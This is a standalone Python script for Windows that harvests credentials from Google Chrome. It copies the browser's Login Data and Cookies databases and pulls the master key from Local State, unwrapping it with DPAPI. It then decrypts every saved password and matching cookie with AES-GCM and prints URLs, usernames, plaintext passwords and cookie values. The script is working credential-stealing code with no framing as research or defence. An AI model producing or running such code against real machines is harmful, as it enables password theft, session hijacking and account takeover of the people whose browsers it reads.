import sqlite3
from Cryptodome.Cipher import AES
import win32crypt
import base64
import json
from shutil import copyfile
import os

chrome_path_login_db = os.path.join(os.getenv(
    "LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Login Data")
chrome_path_local_state = os.path.join(
    os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data", "Local State")
copy_path_cred = os.path.join(os.getenv("TEMP"), "temp_chrome_credentails.db")
copyfile(chrome_path_login_db, copy_path_cred)
conn = sqlite3.connect(copy_path_cred)
cursor = conn.cursor()
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
logins = cursor.fetchall()

print(f"Found {len(logins)} logins")


def get_secret_key():
    try:
        with open(chrome_path_local_state, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:]
        secret_key = win32crypt.CryptUnprotectData(
            secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s" % str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None


def decrypt_password(ciphertext):
    initialisation_vector = ciphertext[3:15]
    encrypted_password = ciphertext[15:]
    secret_key = get_secret_key()
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_vector)
    decrypted_pass = cipher.decrypt(encrypted_password)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass


def get_chrome_cookies(domain=''):
    chrome_path = os.path.join(os.getenv(
        "LOCALAPPDATA"), "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
    copy_path = os.path.join(os.getenv("TEMP"), "temp_chrome_cookies")
    copyfile(chrome_path, copy_path)
    conn = sqlite3.connect(copy_path)
    cursor = conn.cursor()
    cursor.execute(
        "SELECT host_key, name, value, encrypted_value FROM cookies WHERE host_key LIKE ?", ('%' + domain + '%',))
    cookies = {}
    for host_key, name, value, encrypted_value in cursor.fetchall():
        if value or encrypted_value:
            try:
                decrypted_value = decrypt_password(encrypted_value)
            except Exception:
                print(f"Couldn't decrypt cookie {name} from {host_key}")
                continue
            else:
                cookies[name] = (decrypted_value, host_key)
    cursor.close()
    conn.close()
    os.remove(copy_path)
    if not cookies:
        print("0 cookies")
    else:
        for name, (value, host_key) in cookies.items():
            print(f"Cookie: {name}, Value: {value}, Path: {host_key}")
    return cookies


for index, login in enumerate(logins):
    url = login[0]
    username = login[1]
    ciphertext = login[2]
    print("Url:", url)
    print("Username", username)
    passw = decrypt_password(ciphertext)
    print("password:", passw)
    print('\n')

get_chrome_cookies()
